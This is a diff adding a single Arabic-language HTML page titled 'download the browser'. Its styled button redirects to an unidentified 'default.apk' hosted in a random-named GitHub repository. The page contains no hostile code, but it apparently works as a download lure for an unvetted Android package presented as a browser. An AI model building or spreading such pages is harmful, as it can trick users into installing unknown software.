@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تحميل المتصفح</title>
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body, html {
+    height: 100%;
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow: hidden;
+    font-family: 'Arial', sans-serif;
+    background-size: cover;
+    background-position: center;
+    transition: background-image 1s ease-in-out;
+  }
+
+  .download-btn {
+    padding: 20px 50px;
+    font-size: 24px;
+    font-weight: bold;
+    color: #fff;
+    border: none;
+    border-radius: 50px;
+    cursor: pointer;
+    box-shadow: 0 0 20px rgba(0,0,0,0.2);
+    background: linear-gradient(270deg, #ff6a00, #ee0979, #ff6a00);
+    background-size: 600% 600%;
+    animation: gradientMove 5s ease infinite;
+    position: relative;
+    z-index: 1;
+    transition: all 0.4s ease;
+  }
+
+  .download-btn:hover {
+    transform: scale(1.1);
+    box-shadow: 0 0 40px rgba(255,105,0,0.6);
+  }
+
+  @keyframes gradientMove {
+    0% {background-position: 0% 50%;}
+    50% {background-position: 100% 50%;}
+    100% {background-position: 0% 50%;}
+  }
+
+  /* تأثير التحول بعد الضغط */
+  .download-btn.success {
+    background: linear-gradient(45deg, #00c853, #b2ff59);
+    animation: none;
+    transform: scale(1.15);
+  }
+</style>
+</head>
+<body>
+
+<button class="download-btn" id="downloadBtn">تحميل المتصفح</button>
+
+<script>
+  const backgrounds = [
+    'https://i.pinimg.com/originals/21/d5/73/21d57317719970e502def539240dddac.gif',
+    'https://i.pinimg.com/originals/2f/dd/47/2fdd4745001b3c199be23ebd4c9a85b6.gif',
+    'https://i.pinimg.com/originals/bc/a4/54/bca454285ab98ca2d28e1e5eda9ee0d7.gif',
+    'https://i.pinimg.com/originals/4a/19/e8/4a19e82d9a5bb5320fffe591461dfe6e.gif'
+  ];
+
+  function setRandomBackground() {
+    const randomIndex = Math.floor(Math.random() * backgrounds.length);
+    document.body.style.backgroundImage = `url('${backgrounds[randomIndex]}')`;
+  }
+
+  setRandomBackground();
+
+  const downloadBtn = document.getElementById('downloadBtn');
+  downloadBtn.addEventListener('click', () => {
+    // تغيير النص والتأثير
+    downloadBtn.textContent = 'تم!';
+    downloadBtn.classList.add('success');
+    downloadBtn.disabled = true;
+
+    // بعد لحظة بسيطة، يبدأ التحميل
+    setTimeout(() => {
+      window.location.href = 'https://github.com/jfkleajflke/vdsd/releases/download/v1.0.1/default.apk';
+    }, 600);
+  });
+
+  window.addEventListener('load', setRandomBackground);
+</script>
+
+</body>
+</html>
